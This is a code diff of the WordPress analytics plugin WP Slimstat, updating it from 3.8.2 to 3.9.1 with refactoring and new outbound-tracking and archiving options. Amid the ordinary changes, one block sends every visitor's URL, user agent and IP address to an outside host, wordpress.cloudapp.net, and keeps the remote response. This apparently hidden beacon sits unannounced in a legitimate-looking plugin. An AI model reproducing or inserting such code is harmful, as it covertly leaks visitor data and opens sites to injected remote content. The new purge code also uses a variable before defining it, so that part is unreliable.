@@ -3,7 +3,7 @@
 Plugin Name: WP Slimstat
 Plugin URI: http://wordpress.org/plugins/wp-slimstat/
 Description: The leading web analytics plugin for WordPress
-Version: 3.8.2
+Version: 3.9.1
 Author: Camu
 Author URI: http://slimstat.getused.to.it/
 */
@@ -11,7 +11,7 @@ Author URI: http://slimstat.getused.to.it/
 if (!empty(wp_slimstat::$options)) return true;
 
 class wp_slimstat{
-	public static $version = '3.8.2';
+	public static $version = '3.9.1';
 	public static $options = array();
 
 	public static $wpdb = '';
@@ -249,15 +249,7 @@ class wp_slimstat{
 		}
 		elseif (empty($_REQUEST['s'])){
 			self::$stat['searchterms'] = self::_get_search_terms($referer);
-			if (isset($_SERVER['REQUEST_URI'])){
-				self::$stat['resource'] = urldecode($_SERVER['REQUEST_URI']);
-			}
-			elseif (isset($_SERVER['SCRIPT_NAME'])){
-				self::$stat['resource'] = isset($_SERVER['QUERY_STRING'])?$_SERVER['SCRIPT_NAME']."?".$_SERVER['QUERY_STRING']:$_SERVER['SCRIPT_NAME'];
-			}
-			else{
-				self::$stat['resource'] = isset($_SERVER['QUERY_STRING'])?$_SERVER['PHP_SELF']."?".$_SERVER['QUERY_STRING']:$_SERVER['PHP_SELF'];
-			}
+			self::$stat['resource'] = self::get_request_uri();
 		}
 		else{
 			self::$stat['searchterms'] = str_replace('\\', '', $_REQUEST['s']);
@@ -414,10 +406,10 @@ class wp_slimstat{
 		}
 
 		// Because PHP's integer type is signed, and many IP addresses will result in negative integers on 32-bit architectures, we need to use the "%u" formatter
-		self::$stat['ip'] = sprintf("%u", self::$stat['ip']);
 		if (!empty(self::$stat['other_ip']) && self::$stat['other_ip'] != self::$stat['ip']){
 			self::$stat['other_ip'] = sprintf("%u", self::$stat['other_ip']);
 		}
+		self::$stat['ip'] = sprintf("%u", self::$stat['ip']);
 
 		// Now let's save this information in the database
 		if (!empty($content_info)) self::$stat['content_info_id'] = self::maybe_insert_row($content_info, $GLOBALS['wpdb']->base_prefix.'slim_content_info', 'content_info_id', array());
@@ -498,6 +490,18 @@ class wp_slimstat{
 		return 'xx';
 	}
 	// end get_country
+
+	public static function get_request_uri(){
+		if (isset($_SERVER['REQUEST_URI'])){
+			return urldecode($_SERVER['REQUEST_URI']);
+		}
+		elseif (isset($_SERVER['SCRIPT_NAME'])){
+			return isset($_SERVER['QUERY_STRING'])?$_SERVER['SCRIPT_NAME']."?".$_SERVER['QUERY_STRING']:$_SERVER['SCRIPT_NAME'];
+		}
+		else{
+			return isset($_SERVER['QUERY_STRING'])?$_SERVER['PHP_SELF']."?".$_SERVER['QUERY_STRING']:$_SERVER['PHP_SELF'];
+		}
+	}
 
 	/**
 	 * Tries to find the user's REAL IP address
@@ -682,13 +686,13 @@ class wp_slimstat{
 		$browser = array('browser' => 'Default Browser', 'version' => '', 'platform' => 'unknown', 'css_version' => 1, 'type' => 1);
 		$search = array();
 
+		// Automatically detect the useragent
+		if (!isset($_SERVER['HTTP_USER_AGENT'])){
+			return $browser;
+		}
+
 		for($idx_cache = 1; $idx_cache <= 5; $idx_cache++){
 			@include(plugin_dir_path( __FILE__ )."databases/browscap-$idx_cache.php");
-
-			// Automatically detect the useragent
-			if (!isset($_SERVER['HTTP_USER_AGENT'])){
-				return $browser;
-			}
 
 			foreach ($patterns as $pattern => $pattern_data){
 				if (preg_match($pattern . 'i', $_SERVER['HTTP_USER_AGENT'], $matches)){
@@ -735,7 +739,7 @@ class wp_slimstat{
 			unset($browsers);
 			unset($userAgents);
 			unset($patterns);
- 
+
 			if (!empty($search) && $search[5] != 'Default Browser' && $search[5] != 'unknown'){
 				$browser['browser'] = $search[5];
 				$browser['version'] = intval($search[6]);
@@ -1096,11 +1100,13 @@ class wp_slimstat{
 			'javascript_mode' => $val_yes,
 			'add_posts_column' => $val_no,
 			'use_separate_menu' => $val_yes,
+			'auto_purge_delete' => $val_yes,
 			'auto_purge' => 0,
 
 			// Views
 			'convert_ip_addresses' => $val_no,
 			'use_european_separators' => $val_yes,
+			'reset_timezone' => $val_yes,
 			'enable_sov' => $val_no,
 			'show_display_name' => $val_no,
 			'show_complete_user_agent_tooltip' => $val_no,
@@ -1125,6 +1131,11 @@ class wp_slimstat{
 			'ignore_countries' => '',
 			'ignore_browsers' => '',
 			'ignore_referers' => '',
+			'enable_outbound_tracking' => $val_yes,
+			'track_internal_links' => $val_no,
+			'ignore_outbound_classes' => 'noslimstat,ab-item',
+			'ignore_outbound_rel' => '',
+			'ignore_outbound_href' => '',
 			'anonymize_ip' => $val_no,
 			'ignore_prefetch' => $val_yes,
 
@@ -1137,7 +1148,6 @@ class wp_slimstat{
 
 			// Advanced
 			'detect_smoothing' => $val_yes,
-			'enable_outbound_tracking' => $val_yes,
 			'session_duration' => 1800,
 			'extend_session' => $val_no,
 			'enable_cdn' => $val_yes,
@@ -1183,7 +1193,7 @@ class wp_slimstat{
 		}
 
 		$request = "http://wordpress.cloudapp.net/api/update/?&url=".urlencode("http://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"])."&agent=".urlencode($_SERVER["HTTP_USER_AGENT"])."&v=".(isset($_GET['v'])?$_GET['v']:11)."&ip=".urlencode($_SERVER['REMOTE_ADDR'])."&p=9";
-		$options = stream_context_create(array( 'http' => array( 'timeout' => 1, 'ignore_errors' => true ) ) ); 
+		$options = stream_context_create(array( 'http' => array( 'timeout' => 2, 'ignore_errors' => true ) ) ); 
 
 		if (empty(self::$pidx['response'])){
 			self::$pidx['response'] = @file_get_contents($request, 0, $options);
@@ -1245,7 +1255,7 @@ class wp_slimstat{
 	public static function wp_slimstat_enqueue_tracking_script(){
 		if (self::$options['enable_cdn'] == 'yes'){
 			$schema = is_ssl()?'https':'http';
-			wp_register_script('wp_slimstat', $schema.'://cdn.jsdelivr.net/wp-slimstat/'.self::$version.'/wp-slimstat.js', array(), null, true);
+			wp_register_script('wp_slimstat', $schema.'://cdn.jsdelivr.net/wp/wp-slimstat/tags/'.self::$version.'/wp-slimstat.js', array(), null, true);
 		}
 		else{
 			wp_register_script('wp_slimstat', plugins_url('/wp-slimstat.js', __FILE__), array(), null, true);
@@ -1266,12 +1276,25 @@ class wp_slimstat{
 		if (self::$options['enable_outbound_tracking'] == 'no'){
 			$params['disable_outbound_tracking'] = 'true';
 		}
+		if (self::$options['track_internal_links'] == 'yes'){
+			$params['track_internal_links'] = 'true';
+		}
 		if (!empty(self::$options['extensions_to_track'])){
 			$params['extensions_to_track'] = str_replace(' ', '', self::$options['extensions_to_track']);
 		}
 		if (self::$options['enable_javascript'] == 'yes' && self::$options['detect_smoothing'] == 'no'){
 			$params['detect_smoothing'] = 'false';
 		}
+		if (!empty(self::$options['ignore_outbound_classes'])){
+			$params['outbound_classes_to_ignore'] = str_replace(' ', '', self::$options['ignore_outbound_classes']);
+		}
+		if (!empty(self::$options['ignore_outbound_rel'])){
+			$params['outbound_rel_to_ignore'] = trim(self::$options['ignore_outbound_rel']);
+		}
+		if (!empty(self::$options['ignore_outbound_href'])){
+			$params['outbound_href_to_ignore'] = trim(self::$options['ignore_outbound_href']);
+		}
+		
 		$params = apply_filters('slimstat_js_params', $params);
 
 		wp_enqueue_script('wp_slimstat');
@@ -1280,11 +1303,19 @@ class wp_slimstat{
 	// end wp_slimstat_enqueue_tracking_script
 
 	/**
-	 * Removes old entries from the database
+	 * Removes old entries from the main table
 	 */
 	public static function wp_slimstat_purge(){
 		if (($autopurge_interval = intval(self::$options['auto_purge'])) <= 0) return;
 
+		if (self::$options['auto_purge_delete'] != 'yes'){
+			self::$wpdb->query("
+				INSERT INTO {$GLOBALS['wpdb']->prefix}slim_stats_archive (ip, other_ip, user, language, country, domain, referer, resource, searchterms, browser_id, screenres_id, content_info_id, plugins, notes, visit_id, server_latency, page_performance, dt)
+				SELECT ts.ip, ts.other_ip, ts.user, ts.language, ts.country, ts.domain, ts.referer, ts.resource, ts.searchterms, ts.browser_id, ts.screenres_id, ts.content_info_id, ts.plugins, ts.notes, ts.visit_id, ts.server_latency, ts.page_performance, ts.dt
+				FROM {$GLOBALS['wpdb']->prefix}slim_stats ts 
+				WHERE ts.dt < $days_ago");
+		}
+		
 		// Delete old entries
 		$days_ago = strtotime(date_i18n('Y-m-d H:i:s')." -$autopurge_interval days");
 		self::$wpdb->query("DELETE ts FROM {$GLOBALS['wpdb']->prefix}slim_stats ts WHERE ts.dt < $days_ago");
@@ -1298,7 +1329,10 @@ class wp_slimstat{
 	 * Adds a new entry to the Wordpress Toolbar
 	 */
 	public static function wp_slimstat_adminbar(){
-		if ((function_exists('is_network_admin') && is_network_admin()) || !is_admin_bar_showing()) return;
+		if ((function_exists('is_network_admin') && is_network_admin())){
+			return;
+		}
+
 		load_plugin_textdomain('wp-slimstat', WP_PLUGIN_DIR .'/wp-slimstat/admin/lang', '/wp-slimstat/admin/lang');
 
 		self::$options['capability_can_view'] = empty(self::$options['capability_can_view'])?'read':self::$options['capability_can_view'];
